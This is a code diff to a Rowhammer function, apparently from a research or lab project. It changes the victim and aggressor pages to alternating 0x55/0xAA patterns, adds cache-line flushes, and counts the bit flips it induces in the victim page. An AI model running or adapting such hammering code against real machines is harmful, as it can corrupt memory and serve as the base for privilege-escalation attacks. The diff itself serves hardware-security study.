@@ -6,7 +6,13 @@ uint32_t hammer_addresses(uint64_t vict_virt_addr, uint64_t attacker_virt_addr_1
 
     // prime
     uint8_t *vict_virt_addr_ptr = reinterpret_cast<uint8_t *>(vict_virt_addr);
-    memset(vict_virt_addr_ptr, 0xFF, PAGE_SIZE);
+    uint8_t *attacker_virt_addr_1_ptr = reinterpret_cast<uint8_t *>(attacker_virt_addr_1);
+    uint8_t *attacker_virt_addr_2_ptr = reinterpret_cast<uint8_t *>(attacker_virt_addr_2);
+    memset(vict_virt_addr_ptr, 0x55, PAGE_SIZE);
+    memset(attacker_virt_addr_1_ptr, 0xAA, PAGE_SIZE);
+    memset(attacker_virt_addr_2_ptr, 0xAA, PAGE_SIZE);
+    clflush(attacker_virt_addr_1);
+    clflush(attacker_virt_addr_2);
   
     int num_reads = HAMMERS_PER_ITER;
 
@@ -21,10 +27,10 @@ uint32_t hammer_addresses(uint64_t vict_virt_addr, uint64_t attacker_virt_addr_1
             : "rax"
         );
     }
-    clflush(vict_virt_addr);
     uint32_t number_of_bitflips_in_target = 0;
     for (uint32_t index = 0; index < PAGE_SIZE; index++) {
-        if (vict_virt_addr_ptr[index] != 0xFF) {
+        clflush((uint64_t)(vict_virt_addr_ptr + index));
+        if (vict_virt_addr_ptr[index] != 0x55) {
             number_of_bitflips_in_target++;
         }
     }
